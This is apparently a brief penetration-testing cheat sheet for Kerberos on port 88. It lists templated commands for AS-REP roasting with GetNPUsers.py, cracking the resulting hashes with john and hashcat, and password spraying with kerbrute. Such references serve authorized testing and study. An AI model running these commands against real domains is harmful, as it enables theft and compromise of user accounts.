---
description: >-
  a computer-network authentication protocol that works on the basis of tickets
  to allow nodes to communicate over a non-secure network
---

# 88 - Kerberos

### Kerberos Pre-Auth

```text
GetNPUsers.py -dc-ip <target> -usersfile <users> -no-pass <domain>/
GetNPUsers.py -dc-ip <target> -no-pass <domain>/<users>

john <hashfile> -format:krb5asrep --wordlist=<wordlist>
hashcat -m 18200 -a 0 '<hash>' <wordlist> --force
```

```text
kerbrute passwordspray -d <domain> --dc <dc> <users> <pass>
```

